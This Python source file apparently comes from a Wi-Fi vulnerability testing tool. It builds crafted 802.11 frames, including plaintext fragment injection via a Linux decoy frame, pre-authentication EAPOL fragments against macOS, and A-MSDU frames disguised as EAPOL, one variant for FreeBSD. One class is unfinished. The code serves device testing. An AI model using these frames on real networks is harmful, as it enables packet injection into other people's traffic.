from fraginternals import *

class PingTest(Test):
	def __init__(self, ptype, fragments, separate_with=None, opt=None):
		super().__init__(fragments)
		self.ptype = ptype
		self.separate_with = separate_with

		self.bcast = False if opt == None else opt.bcast
		self.as_msdu = False if opt == None else opt.as_msdu
		self.icmp_size = None if opt == None else opt.icmp_size
		self.padding = None if opt == None else opt.padding
		self.to_self = False if opt == None else opt.to_self

	def prepare(self, station):
		log(STATUS, "Generating ping test", color="green")

		# Generate the header and payload
		header, request, self.check_fn = generate_request(station, self.ptype, icmp_size=self.icmp_size, padding=self.padding, to_self=self.to_self)

		if self.as_msdu == 1:
			# Set the A-MSDU frame type flag in the QoS header
			header.Reserved = 1
			# Encapsulate the request in an A-MSDU payload
			request = create_msdu_subframe(station.mac, station.get_peermac(), request)
		elif self.as_msdu == 2:
			# Set A-MSDU flag but include a normal payload (fake A-MSDU)
			header.Reserved = 1

		# Create list of fragment numbers to be used
		fragnums = []
		next_fragnum = 0
		for act in self.actions:
			if act.is_meta(Action.MetaDrop):
				next_fragnum += 1
			elif act.action == Action.Inject:
				fragnums.append(next_fragnum)
				next_fragnum += 1
		self.actions = list(filter(lambda act: not act.is_meta(Action.MetaDrop), self.actions))

		# Generate all the individual (fragmented) frames
		num_frags = len(self.get_actions(Action.Inject))
		frames = create_fragments(header, request, num_frags)

		# Assign frames to the existing fragment objects
		for frag, frame in zip(self.get_actions(Action.Inject), frames):
			if self.bcast:
				frame.addr1 = "ff:ff:ff:ff:ff:ff"

			# Assign fragment numbers according to MetaDrop rules
			frame.SC = (frame.SC & 0xfff0) | fragnums.pop(0)

			frag.frame = frame

		# Put the separator after each fragment if requested.
		if self.separate_with != None:
			for i in range(len(self.actions) - 1, 0, -1):
				# Check if the previous action is indeed an injection
				prev_frag = self.actions[i - 1]
				if prev_frag.action != Action.Inject:
					continue

				# Create a similar inject action for the seperator
				sep_frag = Action(prev_frag.trigger, enc=prev_frag.encrypted)
				sep_frag.frame = self.separate_with.copy()
				station.set_header(sep_frag.frame)

				self.actions.insert(i, sep_frag)

class ForwardTest(Test):
	def __init__(self):
		super().__init__([
			Action(Action.Connected, enc=True)
		])
		self.magic = b"forwarded_data"
		self.check_fn = lambda p: self.magic in raw(p)

	def prepare(self, station):
		# We assume we are targetting the AP
		header = station.get_header(prior=2)
		if header.FCfield & Dot11(FCfield="to-DS").FCfield == 0:
			log(ERROR, "Impossible test! It makes to sense to test whether a client forwards frames.")

		# Set final destination to be us, the client
		header.addr3 = station.mac

		self.actions[0].frame = header/LLC()/SNAP()/IP()/Raw(self.magic)

class LinuxTest(Test):
	def __init__(self, ptype, decoy_tid=None):
		super().__init__([
			# Note: to inject immediately after 4-way provide IPs using --ip and --peerip
			Action(Action.Connected, Action.GetIp),
			Action(Action.Connected, enc=True),
			Action(Action.Connected, enc=True),
			Action(Action.Connected, enc=False)
		])
		self.ptype = ptype
		self.decoy_tid = decoy_tid

	def prepare(self, station):
		header, request, self.check_fn = generate_request(station, self.ptype)
		frag1, frag2 = create_fragments(header, request, 2)

		# Fragment 1: normal
		self.actions[0].frame = frag1

		# Fragment 2: make Linux update latest used crypto Packet Number. Use a dummy packet
		# that can't accidently aggregate with the first fragment in a corrrect packet.
		p = station.get_header(prior=2)/LLC()/SNAP()/IP()/Raw(b"linux_plain decoy fragment")
		p.SC = frag2.SC ^ (1 << 4)

		# - In the attack against Linux, the decoy frame must have the same QoS TID.
		# - On the other hand, some devices seem to only cache fragments for one sequence
		#   number per QoS priority. So to avoid overwriting the first fragment, add this
		#   option to use a different priority for it.
		p.TID = 2
		if self.decoy_tid != None:
			p.TID = 3

		self.actions[1].frame = p

		# Fragment 3: can now inject last fragment as plaintext
		self.actions[2].frame = frag2

class MacOsTest(Test):
	"""
	See docs/macoxs-reversing.md for background on the attack.
	"""
	def __init__(self, ptype, actions):
		super().__init__(actions)
		self.ptype = ptype

	def prepare(self, station):
		# First fragment is the start of an EAPOL frame
		header = station.get_header(prior=2)
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frag1, _ = create_fragments(header, data=request, num_frags=2)

		# Second fragment has same sequence number. Will be accepted
		# before authenticated because previous fragment was EAPOL.
		# By sending to broadcast, this fragment will not be reassembled
		# though, meaning it will be treated as a full frame (and not EAPOL).
		_, request, _ = generate_request(station, self.ptype)
		frag2, = create_fragments(header, data=request, num_frags=1)
		frag2.SC |= 1
		frag2.addr1 = "ff:ff:ff:ff:ff:ff"

		self.actions[0].frame = frag1
		self.actions[1].frame = frag2

class EapolTest(Test):
	# TODO:
	# Test 1: plain unicast EAPOL fragment, plaintext broadcast frame => trivial frame injection
	# Test 2: plain unicast EAPOL fragment, encrypted broadcast frame => just an extra test
	# Test 3: plain unicast EAPOL fragment, encrypted unicast fragment => demonstrates mixing of plain/encrypted fragments
	# Test 4: EAPOL and A-MSDU tests?
	def __init__(self):
		super().__init__([
			Action(Action.BeforeAuth, enc=False),
			Action(Action.BeforeAuth, enc=False)
		])

	def prepare(self, station):
		header = station.get_header(prior=2)
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frag1, frag2 = create_fragments(header, data=request, num_frags=2)

		frag1copy, frag2copy = create_fragments(header, data=request, num_frags=2)
		frag1copy.addr1 = "ff:ff:ff:ff:ff:ff"
		frag2copy.addr1 = "ff:ff:ff:ff:ff:ff"

		self.actions[0].frame = frag1
		self.actions[0].frame = frag2


class EapolAmsduTest(Test):
	def __init__(self, ptype, actions, freebsd=False):
		super().__init__(actions)
		self.ptype = ptype
		self.freebsd = freebsd

	def prepare(self, station):
		log(STATUS, "Generating ping test", color="green")

		# Generate the single frame
		header, request, self.check_fn = generate_request(station, self.ptype)
		# Set the A-MSDU frame type flag in the QoS header
		header.Reserved = 1
		# Testing
		#header.addr2 = "00:11:22:33:44:55"

		# Masquerade A-MSDU frame as an EAPOL frame
		if self.freebsd:
			log(STATUS, "Creating malformed EAPOL/MSDU that FreeBSD treats as valid")
			request = freebsd_create_eapolmsdu(station.mac, station.get_peermac(), request)
		else:
			request = LLC()/SNAP()/EAPOL()/Raw(b"\x00\x06AAAAAA") / create_msdu_subframe(station.mac, station.get_peermac(), request)

		frames = create_fragments(header, request, 1)

		# XXX Where was this needed again?
		auth = Dot11()/Dot11Auth(status=0, seqnum=1)
		station.set_header(auth)
		auth.addr2 = "00:11:22:33:44:55"

		self.actions[0].frame = auth
		self.actions[1].frame = frames[0]


